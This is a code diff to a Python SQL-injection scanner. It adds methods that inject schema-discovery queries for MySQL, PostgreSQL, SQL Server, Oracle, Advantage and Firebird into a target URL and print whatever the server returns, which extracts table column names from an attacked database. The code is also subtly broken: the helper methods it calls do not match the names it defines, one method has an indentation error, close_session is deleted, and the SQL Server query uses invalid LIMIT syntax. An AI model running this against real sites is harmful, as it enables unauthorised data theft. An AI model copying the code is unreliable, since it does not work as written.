@@ -788,8 +788,135 @@ class SQLInjectionScanner:
         else:
             print('Access Denied')
 
-    async def close_session(self):
-        await self.session.close()
+     async def get_column_names(self, dbname, table_name):
+        print(f"Extracting columns for {self.database_type} database and table {table_name}...")
+
+        if self.database_type == "MySQL":
+            await self.extract_mysql_column_names(dbname, table_name)
+        elif self.database_type == "PostGre":
+            await self.extract_postgre_column_names(dbname, table_name)
+        elif self.database_type == "Microsoft_SQL":
+            await self.extract_microsoftsql_column_names(dbname, table_name)
+        elif self.database_type == "Oracle":
+            await self.extract_oracle_column_names(dbname, table_name)
+        elif self.database_type == "Advantage_Database":
+            await self.extract_advantage_column_names(dbname, table_name)
+        elif self.database_type == "Firebird":
+            await self.extract_firebird_column_names(dbname, table_name)
+        else:
+            print(f"Unsupported database type: {self.database_type}")
+
+    async def extract_mysql_column_names(self, dbname, table_name):
+        print("MySQL: Retrieving Column names...")
+
+        query = f"SELECT column_name FROM information_schema.columns WHERE table_schema = '{dbname}' AND table_name = '{table_name}' LIMIT 1; --"
+        await self.execute_mysql_query(dbname, query, result_key='MySQL Column names')
+
+    async def extract_postgre_column_names(self, dbname, table_name):
+        print("PostgreSQL: Retrieving Column names...")
+
+        query = f"SELECT column_name FROM information_schema.columns WHERE table_schema = '{dbname}' AND table_name = '{table_name}' LIMIT 1; --"
+        await self.execute_postgre_query(dbname, query, result_key='PostgreSQL Column names')
+
+    async def extract_microsoftsql_column_names(self, dbname, table_name):
+        print("Microsoft SQL Server: Retrieving Column names...")
+
+        query = f"SELECT column_name FROM information_schema.columns WHERE table_schema = '{dbname}' AND table_name = '{table_name}' LIMIT 1; --"
+        await self.execute_microsoftsql_query(dbname, query, result_key='Microsoft SQL Column names')
+
+    async def extract_oracle_column_names(self, dbname, table_name):
+        print("Oracle: Retrieving Column names...")
+
+        query = f"SELECT column_name FROM all_tab_columns WHERE owner = '{dbname}' AND table_name = '{table_name}' AND ROWNUM = 1; --"
+        await self.execute_oracle_query(dbname, query, result_key='Oracle Column names')
+
+    async def extract_advantage_column_names(self, dbname, table_name):
+        print("Advantage Database: Retrieving Column names...")
+
+        query = f"SELECT AdsColumnName FROM {dbname}.INFORMATION_SCHEMA.AdvantageColumn WHERE AdsTableName = '{table_name}' AND AdsColumnName IS NOT NULL; --"
+        await self.execute_advantage_query(dbname, query, result_key='Advantage Database Column names')
+
+    async def extract_firebird_column_names(self, dbname, table_name):
+        print("Firebird: Retrieving Column names...")
+
+        query = f"SELECT rdb$field_name FROM {dbname}.rdb$relation_fields WHERE rdb$relation_name = '{table_name}' AND rdb$view_blr IS NULL; --"
+        await self.execute_firebird_query(dbname, query, result_key='Firebird Column names')
+
+    async def execute_extract_columns_mysql_query(self, dbname, query, result_key):
+        print(f"MySQL: Executing query: {query}")
+
+        link = f"{self.target_url}+{query}"
+        try:
+            async with self.session.get(link) as response:
+                data = await response.text()
+                print(data)
+        except aiohttp.ClientError as e:
+            print(f"Error performing MySQL GET request for query '{query}': {e}")
+
+    async def execute_extract_columns_postgre_query(self, dbname, query, result_key):
+        print(f"PostgreSQL: Executing query: {query}")
+
+        post_data = {}
+        full_url = f'{self.target_url}+{query}'
+
+        try:
+            async with self.session.post(full_url, data=post_data) as response:
+                data = await response.text()
+                print(data)
+        except Exception as e:
+            print(f"Error performing PostgreSQL POST request for query '{query}': {e}")
+
+    async def execute_extract_columns_microsoftsql_query(self, dbname, query, result_key):
+        print(f"Microsoft SQL Server: Executing query: {query}")
+
+        post_data = {}
+        full_url = f'{self.target_url}+{query}'
+
+        try:
+            async with self.session.post(full_url, data=post_data) as response:
+                data = await response.text()
+                print(data)
+        except Exception as e:
+            print(f"Error performing Microsoft SQL Server POST request for query '{query}': {e}")
+
+    async def execute_extract_columns_oracle_query(self, dbname, query, result_key):
+        print(f"Oracle: Executing query: {query}")
+
+        post_data = {}
+        full_url = f'{self.target_url}+{query}'
+
+        try:
+            async with self.session.post(full_url, data=post_data) as response:
+                data = await response.text()
+                print(data)
+        except Exception as e:
+            print(f"Error performing Oracle POST request for query '{query}': {e}")
+
+    async def execute_extract_columns_advantage_query(self, dbname, query, result_key):
+        print(f"Advantage Database: Executing query: {query}")
+
+        post_data = {}
+        full_url = f'{self.target_url}+{query}'
+
+        try:
+            async with self.session.post(full_url, data=post_data) as response:
+                data = await response.text()
+                print(data)
+        except Exception as e:
+            print(f"Error performing Advantage Database POST request for query '{query}': {e}")
+
+    async def execute_extract_columns_firebird_query(self, dbname, query, result_key):
+        print(f"Firebird: Executing query: {query}")
+
+        post_data = {}
+        full_url = f'{self.target_url}+{query}'
+
+        try:
+            async with self.session.post(full_url, data=post_data) as response:
+                data = await response.text()
+                print(data)
+        except Exception as e:
+            print(f"Error performing Firebird POST request for query '{query}': {e}")
 
     async def run_scanner(self):
         db_type = await self.scan_database_type()
